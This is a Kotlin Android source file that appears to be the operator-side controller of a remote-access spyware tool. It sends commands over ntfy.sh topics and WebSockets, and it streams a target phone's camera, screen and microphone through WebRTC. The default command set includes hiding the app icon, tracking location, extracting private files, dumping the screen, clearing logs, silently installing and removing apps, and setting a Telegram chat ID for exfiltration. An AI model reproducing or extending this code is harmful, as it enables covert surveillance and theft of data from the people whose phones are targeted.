package com.c2c

import android.app.Application
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.c2c.data.local.AppDatabase
import com.c2c.data.local.CommandEntity
import com.c2c.webrtc.WebRtcManager
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.websocket.Frame
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import org.webrtc.RtpTransceiver
import org.webrtc.VideoTrack
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String, val isLive: Boolean = false)

data class AppSettings(
    val ntfyUrl: String, val clientTopic: String, val serverTopic: String, val serverIp: String, val port: String
)

class CoreViewModel(application: Application) : AndroidViewModel(application) {
    
    private val appCtx = application
    private val prefs = application.getSharedPreferences("CoreConfig", Context.MODE_PRIVATE)
    
    private val database = AppDatabase.getDatabase(application)
    private val commandDao = database.commandDao()
    private val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }

    var isWebRtcConnected by mutableStateOf(false)
    var isWebRtcConnecting by mutableStateOf(false)
    var activeVideo by mutableStateOf<String?>(null)
    var activeAudio by mutableStateOf<String?>(null)
    var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)
    
    val webRtcManager = WebRtcManager(
        application,
        signalingSender = { sdpJsonString ->
            sendLive("webrtc_signaling", sdpJsonString)
        },
        onConnectionStateChange = { isConnected ->
            viewModelScope.launch(Dispatchers.Main) {
                isWebRtcConnected = isConnected
                isWebRtcConnecting = false
                
                try {
                    val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    if (!isConnected) {
                        remoteVideoTrack = null
                        activeVideo = null
                        activeAudio = null
                        
                        audioManager.mode = AudioManager.MODE_NORMAL
                        audioManager.isSpeakerphoneOn = false
                        ServerCore.log("WebRTC Link Terminated", false)
                    } else {
                        audioManager.mode = AudioManager.MODE_IN_COMMUNICATION
                        audioManager.isSpeakerphoneOn = true
                        ServerCore.log("WebRTC Link Secured", true)
                    }
                } catch (e: Exception) {
                    ServerCore.log("Audio Routing Error: ${e.message}", false)
                }
            }
        }
    )

    private val _commands = MutableStateFlow<List<CommandEntity>>(emptyList())
    val commands: StateFlow<List<CommandEntity>> = _commands.asStateFlow()

    private val _pendingCommands = MutableStateFlow<Set<String>>(emptySet())
    val pendingCommands = _pendingCommands.asStateFlow()
    private var commandQueue = Channel<QueuedCommand>(Channel.UNLIMITED)
    private var workerJob: Job? = null
    private val isNetworkAvailable = MutableStateFlow(true)
    val toggleStates = mutableStateMapOf<String, Boolean>() 
    
    var isVerboseMode by mutableStateOf(false)

    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    private var ntfyListenerJob: Job? = null

    init {
        webRtcManager.initialize()
        monitorNetwork()
        startQueueWorkers()
        startNtfyListener()

        viewModelScope.launch(Dispatchers.IO) {
            commandDao.getAllCommands().collect { list ->
                if (list.isEmpty()) seedDefaultCommands()
                else _commands.value = list.sortedBy { it.label }
            }
        }

        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (log.contains("RECV:")) {
                    try {
                        val wrapper = JSONObject(log.substringAfter("RECV: "))
                        val cmdStr = wrapper.optString("cmd")
                        
                        if (cmdStr == "telemetry") {
                            val argStr = wrapper.optString("arg")
                            val arg = JSONObject(argStr)
                            val mic = arg.optBoolean("mic")
                            val vid = arg.optString("vid")
                            ServerCore.log("Heartbeat -> Mic: ${if(mic) "ON" else "OFF"} | Vid: $vid", null)
                            
                        } else if (cmdStr == "webrtc_signaling") {
                            val argObj = wrapper.optJSONObject("arg")
                            val payload = argObj ?: JSONObject(wrapper.getString("arg"))
                            webRtcManager.handleSignalingMessage(payload)
                        } else if (cmdStr == "rtc_ack") {
                            val ackPayload = JSONObject(wrapper.getString("arg"))
                            val type = ackPayload.optString("type")
                            val mode = ackPayload.optString("mode")

                            if (type == "audio_ready") {
                                if (mode == "call" || mode == "broadcast") {
                                    webRtcManager.enableLocalAudio()
                                } else {
                                    webRtcManager.disableLocalAudio()
                                }
                                
                                val dir = when (mode) {
                                    "call" -> RtpTransceiver.RtpTransceiverDirection.SEND_RECV
                                    "broadcast" -> RtpTransceiver.RtpTransceiverDirection.SEND_ONLY
                                    "receive" -> RtpTransceiver.RtpTransceiverDirection.RECV_ONLY
                                    else -> RtpTransceiver.RtpTransceiverDirection.INACTIVE
                                }
                                webRtcManager.setAudioDirection(dir)
                                webRtcManager.setRemoteAudioEnabled(mode == "call" || mode == "receive")
                            } else if (type == "video_ready") {
                                webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.RECV_ONLY)
                            }
                        }
                    } catch (e: Exception) {}
                }
                
                if (serverLogs.size > 150) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
            }
        }
    }

    fun getSettings(): AppSettings {
        return AppSettings(
            ntfyUrl = prefs.getString("ntfyUrl", "https://ntfy.sh") ?: "https://ntfy.sh",
            clientTopic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789",
            serverTopic = prefs.getString("serverTopic", "sys_linker_server_responses_xyz789") ?: "sys_linker_server_responses_xyz789",
            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0", 
            port = prefs.getInt("port", 8765).toString()
        )
    }

    fun saveSettings(settings: AppSettings) {
        prefs.edit()
            .putString("ntfyUrl", settings.ntfyUrl)
            .putString("ntfyTopic", settings.clientTopic)
            .putString("serverTopic", settings.serverTopic)
            .putString("serverIp", settings.serverIp)
            .putInt("port", settings.port.toIntOrNull() ?: 8765)
            .apply()
        ServerCore.log("Core Settings Applied.", true)
        startNtfyListener() 
    }

    private fun startNtfyListener() {
        ntfyListenerJob?.cancel()
        ntfyListenerJob = viewModelScope.launch(Dispatchers.IO) {
            val client = OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .build()
                
            while (isActive) {
                try {
                    val settings = getSettings()
                    val url = if (settings.ntfyUrl.startsWith("http")) "${settings.ntfyUrl.trimEnd('/')}/${settings.serverTopic}/json" 
                              else "https://${settings.ntfyUrl}/${settings.serverTopic.trimEnd('/')}/json"
                    
                    val request = Request.Builder().url(url).header("User-Agent", "C2C-Server/1.0").build()
                    client.newCall(request).execute().use { response ->
                        if (!response.isSuccessful) throw Exception("HTTP ${response.code}")
                        val reader = BufferedReader(InputStreamReader(response.body!!.byteStream()))
                        while (isActive) {
                            val line = reader.readLine() ?: break
                            if (line.isNotBlank()) {
                                try {
                                    val json = JSONObject(line)
                                    if (json.optString("event") == "message") {
                                        val msg = json.getString("message")
                                        ServerCore.log("CLIENT: $msg", true)
                                    }
                                } catch (e: Exception) {}
                            }
                        }
                    }
                } catch (e: Exception) {
                    delay(5000)
                }
            }
        }
    }

    private fun monitorNetwork() {
        val connectivityManager = appCtx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        connectivityManager.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) { isNetworkAvailable.value = true }
            override fun onLost(network: Network) { isNetworkAvailable.value = false }
        })
    }

    private fun startQueueWorkers() {
        workerJob?.cancel() 
        commandQueue.cancel() 
        commandQueue = Channel(Channel.UNLIMITED) 
        _pendingCommands.value = emptySet() 

        workerJob = viewModelScope.launch(Dispatchers.IO) {
            repeat(3) { 
                launch {
                    for (task in commandQueue) {
                        processTask(task)
                    }
                }
            }
        }
    }

    private suspend fun processTask(task: QueuedCommand) {
        var success = false
        while (!success) {
            if (!_pendingCommands.value.contains(task.uiKey)) {
                ServerCore.log("ABORTED: ${task.cmd}", false)
                return
            }

            isNetworkAvailable.first { it }

            try {
                val payloadJson = JSONObject()
                    .put("cmd", task.cmd)
                    .put("verbose", isVerboseMode)
                    
                if (task.arg.isNotBlank()) payloadJson.put("arg", task.arg)
                val payloadString = payloadJson.toString()

                if (task.isLive) {
                    val sessions = synchronized(ServerCore.liveSessions) { ServerCore.liveSessions.toList() }
                    sessions.forEach { session ->
                        if (session.isActive) session.send(Frame.Text(payloadString)) 
                    }
                    ServerCore.log("LIVE SENT: ${task.cmd}", true)
                } else { 
                    val settings = getSettings()
                    val targetUrl = if (settings.ntfyUrl.startsWith("http")) "${settings.ntfyUrl.trimEnd('/')}/${settings.clientTopic}" 
                                    else "https://${settings.ntfyUrl}/${settings.clientTopic.trimEnd('/')}"
                    
                    httpClient.post(targetUrl) { setBody(payloadString) }
                    ServerCore.log("NTFY SENT: ${task.cmd}", true)
                }
                success = true
            } catch (e: Exception) {
                ServerCore.log("NETWORK DROP: ${task.cmd} paused. Retrying...", false)
                delay(3000) 
            }
        }
        _pendingCommands.update { it - task.uiKey } 
    }

    fun enqueueCommand(cmd: String, arg: String = "", uiKey: String = cmd, isLive: Boolean = false) {
        if (isLive) {
            _pendingCommands.update { it + uiKey }
            viewModelScope.launch(Dispatchers.IO) {
                val startTime = System.currentTimeMillis()
                try {
                    val payloadJson = JSONObject().put("cmd", cmd).put("verbose", isVerboseMode)
                    if (arg.isNotBlank()) payloadJson.put("arg", arg)
                    
                    val sessions = synchronized(ServerCore.liveSessions) { ServerCore.liveSessions.toList() }
                    if (sessions.isNotEmpty()) {
                        sessions.forEach { session ->
                            if (session.isActive) session.send(io.ktor.websocket.Frame.Text(payloadJson.toString()))
                        }
                        ServerCore.log("LIVE SENT: $cmd", true)
                    } else {
                        ServerCore.log("LIVE FAILED: No WebSocket Connected.", false)
                    }
                } catch (e: Exception) {
                    ServerCore.log("LIVE ERROR: ${e.message}", false)
                } finally {
                    val elapsed = System.currentTimeMillis() - startTime
                    if (elapsed < 300) {
                        delay(300 - elapsed)
                    }
                    _pendingCommands.update { it - uiKey } 
                }
            }
        } else {
            _pendingCommands.update { it + uiKey }
            commandQueue.trySend(QueuedCommand(uiKey, cmd, arg, isLive = false))
            ServerCore.log("QUEUED: $cmd")
        }
    }

    fun activateKillSwitch() {
        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue.", false)
        startQueueWorkers() 
    }

    fun saveCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            if (command.id == 0) {
                commandDao.insertCommand(command)
                ServerCore.log("Command created: ${command.label}", true)
            } else {
                commandDao.updateCommand(command)
                ServerCore.log("Command updated: ${command.label}", true)
            }
        }
    }

    fun deleteCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.deleteCommand(command)
            ServerCore.log("Command deleted: ${command.label}", true)
        }
    }

    private suspend fun seedDefaultCommands() {
        val defaults = listOf(
            CommandEntity(id=1, label="Flash On", cmd="flash", defaultArg="on", icon="flashlight_on", category="Quick", isToggle=true, toggledLabel="Flash Off", toggledCmd="flash", toggledArg="off"),
            CommandEntity(id=2, label="Location", cmd="loc", defaultArg="", icon="location", category="Quick"),
            CommandEntity(id=3, label="Volume 100%", cmd="vol", defaultArg="100", icon="volume_up", category="Quick", isToggle=true, toggledLabel="Volume 0%", toggledCmd="vol", toggledArg="0"),

            CommandEntity(id=7, label="Menu", cmd="btn_recents", defaultArg="", icon="menu", category="SoftKey"),
            CommandEntity(id=8, label="Home", cmd="btn_home", defaultArg="", icon="circle", category="SoftKey"),
            CommandEntity(id=9, label="Back", cmd="btn_back", defaultArg="", icon="arrow_back_ios_new", category="SoftKey"),

            CommandEntity(id=10, label="Ping Target", cmd="ping", defaultArg="", icon="radar", category="System"),
            CommandEntity(id=11, label="Full Intel", cmd="info", defaultArg="", icon="info", category="System"),
            CommandEntity(id=12, label="Extract Logs", cmd="get_log", defaultArg="", icon="description", category="System"),
            CommandEntity(id=13, label="Clear Logs", cmd="clear_log", defaultArg="", icon="delete_sweep", category="System"),
            CommandEntity(id=14, label="Hide Icon", cmd="icon_hide", defaultArg="", icon="visibility_off", category="System", isToggle=true, toggledLabel="Show Icon", toggledCmd="icon_show", toggledArg=""),
            CommandEntity(id=15, label="Toggle Wi-Fi", cmd="toggle_wifi", defaultArg="on", icon="wifi", category="System", isToggle=true, toggledLabel="Toggle Wi-Fi", toggledCmd="toggle_wifi", toggledArg="off"),
            CommandEntity(id=16, label="Toggle Hotspot", cmd="toggle_hotspot", defaultArg="on", icon="router", category="System", isToggle=true, toggledLabel="Toggle Hotspot", toggledCmd="toggle_hotspot", toggledArg="off"),
            
            CommandEntity(id=20, label="App Install", cmd="install_app", defaultArg="/sdcard/app.apk", icon="system_update", category="App Mgmt"),
            CommandEntity(id=21, label="App Uninstall", cmd="uninstall_app", defaultArg="com.whatsapp", icon="delete_sweep", category="App Mgmt"),
            CommandEntity(id=22, label="Extract File", cmd="send", defaultArg="my_private_doc.pdf", icon="upload_file", category="App Mgmt"),
            
            CommandEntity(id=30, label="Dump Screen", cmd="dump_screen", defaultArg="", icon="screenshot_monitor", category="Automation"),
            CommandEntity(id=31, label="Track Macro", cmd="track_activity", defaultArg="10, temp_macro", icon="track_changes", category="Automation"),
            CommandEntity(id=32, label="Perform Macro", cmd="perform", defaultArg="2, 1, temp_macro", icon="play_arrow", category="Automation"),
            CommandEntity(id=33, label="Workflow Send", cmd="workflow", defaultArg="default", icon="account_tree", category="Automation"),
            CommandEntity(id=34, label="WF Status", cmd="status_workflow", defaultArg="default", icon="description", category="Automation"),
            CommandEntity(id=35, label="Halt Workflow", cmd="halt_workflow", defaultArg="all", icon="stop", category="Automation", isToggle=true, toggledLabel="Resume Workflow", toggledCmd="resume_workflow", toggledArg="all"),

            CommandEntity(id=50, label="Set TG Target", cmd="set_target_chatid", defaultArg="7911866129", icon="code", category="Config"),
            CommandEntity(id=36, label="Connect WS", cmd="live_start", defaultArg="ws://127.0.0.1:8765/live", icon="server", category="System", isToggle=true, toggledLabel="Disconnect WS", toggledCmd="live_end", toggledArg="")
        )
        defaults.forEach { commandDao.insertCommand(it) }
    }

    fun toggleWebRtc() {
        if (isWebRtcConnected) {
            terminateWebRtcConnection()
        } else {
            isWebRtcConnecting = true
            sendLive("webrtc", "start")
            
            webRtcManager.createPeerConnection(isCaller = true) { track ->
                viewModelScope.launch(Dispatchers.Main) {
                    remoteVideoTrack = track
                }
            }
            ServerCore.log("Initiating WebRTC Link...", true)

            viewModelScope.launch {
                delay(6000)
                if (isWebRtcConnecting && !isWebRtcConnected) {
                    ServerCore.log("WebRTC Timeout (6s). Aborting.", false)
                    terminateWebRtcConnection()
                    isWebRtcConnecting = false
                }
            }
        }
    }

    fun terminateWebRtcConnection() {
        webRtcManager.terminate()
        isWebRtcConnecting = false
        remoteVideoTrack = null
        activeVideo = null
        activeAudio = null
        sendLive("webrtc", "stop")
    }

    fun toggleAudioStream(type: String) {
        if (activeAudio == type) {
            activeAudio = null
            sendLive("rtc_audio", "stop")
            webRtcManager.setAudioDirection(RtpTransceiver.RtpTransceiverDirection.INACTIVE)
            webRtcManager.setRemoteAudioEnabled(false)
            webRtcManager.disableLocalAudio()
        } else {
            activeAudio?.let { sendLive("rtc_audio", "stop") }
            activeAudio = type
            sendLive("rtc_audio", type)
        }
    }

    fun toggleVideoStream(type: String) {
        if (activeVideo == type) {
            sendLive(if (type == "screen") "rtc_screen" else "rtc_video", "stop")
            activeVideo = null
            webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.INACTIVE)
        } else {
            activeVideo?.let { sendLive(if (it == "screen") "rtc_screen" else "rtc_video", "stop") }
            activeVideo = type
            sendLive(if (type == "screen") "rtc_screen" else "rtc_video", if (type == "screen") "start" else type)
        }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            val sessions = synchronized(ServerCore.liveSessions) { ServerCore.liveSessions.toList() }
            if (sessions.isNotEmpty()) {
                val jsonStr = JSONObject().put("cmd", cmd).apply {
                    if (arg.isNotBlank()) put("arg", arg)
                }.toString()
                sessions.forEach { session -> 
                    try { session.send(Frame.Text(jsonStr)) } catch(e: Exception){} 
                }
            }
        }
    }

    fun toggleServer(context: Context) {
        val currentSettings = getSettings()
        val port = currentSettings.port.toIntOrNull() ?: 8765
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", port) }
        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
    }

    override fun onCleared() {
        super.onCleared()
        ntfyListenerJob?.cancel()
        workerJob?.cancel()
        webRtcManager.terminate()
        try {
            val audioManager = appCtx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.mode = AudioManager.MODE_NORMAL
            audioManager.isSpeakerphoneOn = false
        } catch (e: Exception) {}
    }
}